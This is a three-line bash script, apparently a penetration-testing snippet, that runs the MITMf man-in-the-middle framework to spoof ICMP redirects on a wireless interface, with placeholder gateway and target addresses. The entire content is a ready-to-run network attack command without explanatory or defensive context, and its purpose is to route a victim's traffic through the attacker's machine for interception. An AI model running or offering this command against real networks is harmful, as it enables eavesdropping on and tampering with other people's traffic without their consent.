#!/bin/bash
# ICMP redirect spoof
python mitmf.py --spoof --icmp --iface wlan0 --gateway IP --target IP

